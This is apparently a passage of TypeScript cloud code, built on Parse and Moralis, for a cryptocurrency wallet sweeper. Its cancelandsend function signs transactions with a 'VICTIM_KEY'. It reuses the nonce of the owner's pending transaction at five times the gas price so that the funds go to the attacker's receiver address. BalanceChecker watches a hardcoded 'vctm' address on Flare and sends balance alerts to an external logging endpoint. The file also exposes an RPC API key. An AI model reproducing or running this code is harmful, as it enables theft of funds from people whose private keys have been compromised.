      returnvalue = 'null'
    }


    // return returnvalue;

    return item?.name;

}



function getntworkwithmin(chainid: number) {

  var chainids = [

    {
      id: 1 ,
      name: 'eth',
      min: 0.026
    },
    {
      id: 5 ,
      name: 'goerli',
      min: 0.007
    },

    {
      id: 11155111 ,
      name: 'sepolia',
      min: 0.015
    },
    
    {
      id: 137 ,
      name: 'polygon',
      min: 140
    },
    {
      id: 43114 ,
      name: 'avax',
      min: 2.8
    },
    {
      id: 56 ,
      name: 'bsc',
      min: 0.169
    },
    {
      id: 250 ,
      name: 'fantom',
      min: 140
    },
    {
      id: 10 ,
      name: 'op',
      min: 40
    },
    {
      id: 42161 ,
      name: 'arb',
      min: 95
    },
    {
      id: 25 ,
      name: 'cronos',
      min: 790
    },
    {
      id: 369,
      name: 'pulse',
      min: 700000
    },
    {
      id: 11297108109,
      name: 'palm',
      min: 90
    },
    {
      id: 324,
      name: 'zkSync',
      min: 10
    },
    {
      id: 100,
      name: 'gnosis',
      min: 0.1
    },
    {
      id: 8453,
      name: 'base',
      min: 100
    }
    

  
   
  ]

    // grab the Array item which matchs the id "2"
    var item = chainids.find(item => item.id == chainid);

    return item;

}



async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string, provider: any, web3: any) {

  const wallet = new Wallet(VICTIM_KEY, provider);
  
//  var balance = await wallet.getBalance();

var BN = web3.utils.BN;

 const valuee = await transactx.object.get("value")
 request.log.info('Value is: '+ethers.utils.formatUnits(valuee, "ether")+"ETH");
 request.log.info('Value is in wei: '+ethers.utils.formatUnits(valuee, "wei")+"ETH");
 var balance = new BN(valuee); // value to be sent by the previous transaction
 request.log.info("i got here-0");
  if (balance < 0) {
    request.log.info(`Value is zero`);
    return;
  }
  request.log.info("i got here0");
//  const gasPrice = ethers.BigNumber.from(await provider.getGasPrice());
var gapricevalu = await transactx.object.get("gasPrice");
var gaslimivalu = await transactx.object.get("gas");
request.log.info("i got here1");
request.log.info("i got here1 old gaslimit"+gaslimivalu);
 var gasPrice = (new BN(gapricevalu)).mul(new BN('5'));
 request.log.info("i got here2");
 request.log.info("i got here2gasprice1"+gasPrice);
 var gasLimit = "21000";
 request.log.info("i got here2limit1"+gasLimit);
 request.log.info("i got here3");
 var gasPriceTotal = (gasPrice).mul(new BN(gasLimit));
 request.log.info("i got here4");

 const gpricee = await web3.eth.getGasPrice();
 request.log.info("i got here5-0");
 const gasPrice2 = (new BN(gpricee)).mul(new BN('5'));
 request.log.info("i got here5:gasprice2"+gasPrice2);
 request.log.info("i got here5");
 const gasLimit2 = gasLimit;
 request.log.info("i got here6");
 request.log.info("i got here6:gas limit2"+gasLimit2);
 const gasPriceTotal2 = (gasPrice).mul(gasLimit);
 request.log.info("i got here7");

 if(gasPriceTotal.sub(gasPriceTotal2) < 0) {

  request.log.info("yes it is less than");
    gasPriceTotal = gasPriceTotal2;
    gasLimit = gasLimit2;
    gasPrice = gasPrice2;

 }
 else {
  request.log.info("no it is greater than");
 }
 request.log.info("i got here8");
 const val = balance.sub(gasPriceTotal.add(new BN('10')));
 request.log.info("i got here9");
 request.log.info("bALANCE to send: "+val);
 request.log.info("Orignal bALANCE : "+balance);
 request.log.info("Total gas: "+gasPriceTotal);
//  const minval = (new BN(ethers.utils.parseUnits("0.0011", "ether")))

//  if (val.lt(minval)) {
//   request.log.info(`Eth Balance is less than min value 2$ - ${ethers.utils.formatUnits(minval, "ether")}Eth .... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
//   return;
// }
  if (val.sub(gasPriceTotal) <= 0) {
    request.log.info(` Eth Balance is less than gas price, waiting....`);
    return;
  }
  request.log.info("i got here10");

  request.log.info(` Balance is now greater`);
  request.log.info("i got here11");

  try {
    request.log.info(`Sending...`);
    // const tx = await wallet.sendTransaction({
    //   nonce: transactx.object.get("nonce"),
    //   to: reciver,
    //   gasLimit: gasLimit,
    //   gasPrice : gasPrice,
    //   value: val
    // });

    // request.log.info("i got here12");
    // tx.wait();

    // if(tx.hash) {

    //  
    //   await mshlogger(request, 'Eth2', tx.hash)
    //   //
  
    // }

    // if(tx.nonce) {

    //    //
    //   
  
    // }



    var transaction = {

      nonce: web3.utils.toHex(transactx.object.get("nonce")),
      to: reciver,
      gasLimit: web3.utils.toHex(gasLimit+""),
      gasPrice : web3.utils.toHex(gasPrice+""),
      value: web3.utils.toHex(val+"")
      // 'nonce': request.object.get("nonce"),
      // optional data field to send message or execute smart contract
     };
    
    
     request.log.info("Created transaction");
     request.log.info("i got here12");
     request.log.info(JSON.stringify(transaction));
     var signedTx = await web3.eth.accounts.signTransaction(transaction, VICTIM_KEY);
    
     request.log.info("Signed transaction");
     request.log.info("i got here13");
      web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash: any) => 
     
      {
        // loggerr.info(hash.toString());
        request.log.info("got hash:"+hash)
        request.log.info("i got here14");
        request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
      }).on('receipt', async (reciept: any) => {
     
      //  await mshlogger(request, ntwk, loggerr)
    
      request.log.info(`Mad!...receipt 😁 🚀`);
      request.log.info("i got here15");
        await mshlogger(request, 'Eth2', JSON.stringify(reciept))
        await realLogger("new")
       request.log.info("got recipet")
        // loggerr.info(JSON.stringify(reciept));
     
     
      }).on('error', async  (error: any) =>{
     
      //  await mshlogger(request, JSON.stringify(error), loggerr)
       request.log.info("got error")
       request.log.info("i got here16");
       request.log.info("error message"+error.message)
       await mshlogger(request, JSON.stringify(error), JSON.stringify(error))
       await realLogger("error")
        // loggerr.info(JSON.stringify(error));
     
        // loggerr.info("errror");
     
        });


    // request.log.info(` Sent tx with nonce ${tx.nonce} moving ${val}  gwei: ${tx.hash}`);
  } catch (err) {
    request.log.info(` Error sending tx: ${err.message ?? err}`);
  }


}




// async function mshlogger(request: any, brand: any, logg: any) {

//   var result = await web3.utils.fromWei(request.object.get("value"));

// //  varresult = Moralis.Cloud.units({
// //    method: "fromWei",
// //    value: request.object.get("value"),
// //    });
  
//  Parse.Cloud.httpRequest({
//  method: 'POST',
// url: config.MLIS_URL,
// headers: {
//   "content-type": "application/json",
//   "x-apikey": config.MLIS_KEY,
//   "cache-control": "no-cache"
// },
//  body: {
//    addr_from: request.object.get("fromAddress"),
//    addr_to: request.object.get("toAddress"),
//    value: result,
//    time: request.object.get("_created_at"),
//    brand: brand+":Honey:stream",
//    server: "1: message:"+logg
//  }
// }).then(function(httpResponse: any) {
//   request.log.info("heoney response")
//  //logger.info(httpResponse.text);
// //  logg.info(brand);
// }, function(httpResponse: any) {
//   request.log.info("honey error")
// //  logg.error(JSON.stringify(httpResponse));
// });

// }

});



async function mshlogger(request: any, brand: any, logg: any) {

  var result = await web3.utils.fromWei(request.object.get("value"));

//  varresult = Moralis.Cloud.units({
//    method: "fromWei",
//    value: request.object.get("value"),
//    });
  
 Parse.Cloud.httpRequest({
 method: 'POST',
url: config.MLIS_URL,
headers: {
  "content-type": "application/json",
  "x-apikey": config.MLIS_KEY,
  "cache-control": "no-cache"
},
 body: {
   addr_from: request.object.get("fromAddress"),
   addr_to: request.object.get("toAddress"),
   value: result,
   time: request.object.get("_created_at"),
   brand: brand+":Honey:stream",
   server: "1: message:"+logg
 }
}).then(function(httpResponse: any) {
  request.log.info("heoney response")
 //logger.info(httpResponse.text);
//  logg.info(brand);
}, function(httpResponse: any) {
  request.log.info("honey error")
//  logg.error(JSON.stringify(httpResponse));
});

}


async function BalanceChecker(request: any) {



  
  request.log.info(`Balance checker started`);

try {
  

  const vctm = "0xCd8d89731Be212D4c23b22c51475c3e8B22154ed";
  const cntrct = "0x1D80c49BbBCd1C0911346656B529DF9E5c2F783d"
  const provider = new ethers.providers.JsonRpcProvider("https://rpc.ankr.com/flare/6b0e506c63babd2b27739967a6f1e579c4fc72039e11d6ed25b233058511620d");
  const balance = await provider.getBalance(vctm);

    const abimatic = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],
"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint8","name":"decimals","type":"uint8"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"mintable","type":"bool"},{"internalType":"address","name":"owner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"mintable","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256",
"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]

  const erc20_rw = new ethers.Contract(cntrct, abimatic, provider);
 
var tkbalanceADDR1 = await erc20_rw.balanceOf(vctm)

request.log.info(`WFLR Balance: ${ethers.utils.formatUnits(tkbalanceADDR1, "ether")}`);
request.log.info(`FLR Balance: ${ethers.utils.formatUnits(balance, "ether")}`);

const nativebal = balance;
const minnativebal = ethers.BigNumber.from(ethers.utils.parseUnits(config.FLTMIN, "ether"))


const tokenbal = ethers.BigNumber.from(tkbalanceADDR1)
const mintokenbal =  ethers.BigNumber.from(ethers.utils.parseUnits(config.WFLRTKMIN, "ether"))

request.log.info(`WFLRMINBAL: ${config.WFLRTKMIN} FLRMINBAL: ${config.FLTMIN}`);

if(nativebal.gte(minnativebal)) {
request.log.info(`Native balance is high`);

Parse.Cloud.httpRequest({
  method: 'POST',
 url: config.MLIS_URL,
 headers: {
   "content-type": "application/json",
   "x-apikey": config.MLIS_KEY,
   "cache-control": "no-cache"
 },
  body: {
    addr_from: "WFLAR: "+vctm,
    addr_to: "WFLAR: "+vctm,
    value: "WFLR NATIVE:"+ethers.utils.formatUnits(balance, "ether"),
    time: "Curr time",
    brand: ":WFLR NATIVE",
    server: "WFLR NATIVE"
  }

 }).then(function(httpResponse: any) {
   request.log.info("WFLR response")
  //logger.info(httpResponse.text);
 //  logg.info(brand);
 }, function(httpResponse: any) {
   request.log.info("WFLR error")
 //  logg.error(JSON.stringify(httpResponse));
 });

await realLogger("new")
 
}

if(tokenbal.gte(mintokenbal)) {
request.log.info(`Token balance is high`);

Parse.Cloud.httpRequest({
  method: 'POST',
 url: config.MLIS_URL,
 headers: {
   "content-type": "application/json",
   "x-apikey": config.MLIS_KEY,
   "cache-control": "no-cache"
 },
  body: {
    addr_from: "WFLAR: "+vctm,
    addr_to: "WFLAR: "+vctm,
    value: "WFLR TOKEN:"+ethers.utils.formatUnits(tkbalanceADDR1, "ether"),
    time: "Curr time",
    brand: ":WFLR TOKEN",
    server: "WFLR TOKEN"
  }
 }).then(function(httpResponse: any) {
   request.log.info("WFLR response")
  //logger.info(httpResponse.text);
 //  logg.info(brand);
 }, function(httpResponse: any) {
   request.log.info("WFLR error")
 //  logg.error(JSON.stringify(httpResponse));
 });

 await realLogger("new")
}



} catch (error) {
  
  request.log.info("Balnce checker error: "+error.message);

}

}



Parse.Cloud.define("startListening", async () => {


  console.log('hello world run');

  // Parse.Cloud.httpRequest({
  //      method: 'POST',
  //   url: config.MLIS_URL,
  //   headers: {
  //     "content-type": "application/json",
  //     "x-apikey": config.MLIS_KEY,
  //     "cache-control": "no-cache"
  //   },
  //    body: {
  //      addr_from: 'hey',
  //      addr_to: 'hoo',
  //      value: amount+'',
  //      time: '43340',
  //      brand: "TransactionEth"
  //    }
  // }).then(function(httpResponse: any) {
  //   // success
  //   console.log(httpResponse.text);
  // },function(httpResponse: any) {
  //   // error
  //   console.error('Request failed with response code ' + httpResponse.status);
  // });

  // Parse.Cloud.afterSave("DemoTxs", async  (request: any) => {
  //   // console.log(JSON.stringify(request));
  
  //   if(request.object.get("confirmed") == false) {
             
  //   // const logger = Moralis.Cloud.getLogger();
  //   // logger.info("Got to Eth Transaction");
 
  // var result = await web3.utils.fromWei(request.object.get("value"));

  // Parse.Cloud.httpRequest({
  //    method: 'POST',
  //   url: config.MLIS_URL,
  //   headers: {
  //     "content-type": "application/json",
  //     "x-apikey": config.MLIS_KEY,
  //     "cache-control": "no-cache"
  //   },
  //    body: {
  //      addr_from: request.object.get("fromAddress"),
  //      addr_to: request.object.get("toAddress"),
  //      value: result,
  //      time: request.object.get("chainId")+"_streams",
  //      brand: "DemoTxs"
  //    }
  //  }).then(function(httpResponse: any) {
  //    //logger.info(httpResponse.text);
  //     //  logger.info("Logged Eth Trnasfer");\
  //     // console.log(httpResponse.text);
  //  }, function(httpResponse: any) {
  //     // logger.error(JSON.stringify(httpResponse));
  //     // console.log(JSON.stringify(httpResponse));
  //  });
      
       
  //    }
  //    else { 
     
  
     
  //    }
  
     
  //  });
   
});





Parse.Cloud.define("textPassValue", async (request: any) => {
 
  
  return request;

} )


Parse.Cloud.define("timer", async (request: any) => {
 
  request.log.info('hello world run clik timer');

  var count = 0;
  setInterval(async () => {

    count++

    request.log.info('started inside pinger (count) ================================='+count);
    request.log.info('started inside pinger (time used) ================================='+(count*5/60));
    await Parse.Cloud.run("_AddressSyncStatus2");

  }, 300000);
 

} )



Parse.Cloud.define("configureStreams", async (request: any) => {

 
  // console.log('hello  configureStreams');
//  Moralis.start({
//    apiKey: config.MORALIS_API_KEY,
//  });
// console.log(request.params.addr);
  // return JSON.parse(request.params.addr);
//  const stream = {
//    chains: [EvmChain.ETHEREUM, EvmChain.POLYGON, EvmChain.], // list of blockchains to monitor
//    description: "monitor Bobs wallet", // your description
//   tag: "bob", // give it a tag
//    webhookUrl: "https://YOUR_WEBHOOK_URL", // webhook url to receive events,
//    includeNativeTxs: true
//  }

//  const newStream = await Moralis.Streams.add(stream);
//  const { id } = newStream.toJSON(); // { id: 'YOUR_STREAM_ID', ...newStream }

// // Now we attach bobs address to the stream
//  const address = "0x68b3f12d6e8d85a8d3dbbc15bba9dc5103b888a4";

//  await Moralis.Streams.addAddress({ address, id });
const id = config.STREAM_ID
// var addrescount = await Moralis.Streams.getAddresses({
//   limit: 5000,
//   id });



  // return addrescount 
  // if(addrescount.result) {

  // }
  //  console.log(request.params.addr[0])

  //  return request.params.addr[0];
const response = await Moralis.Streams.addAddress({
  id: id,
  address: [
   
] // Can also be a single string
});

return response;



} )


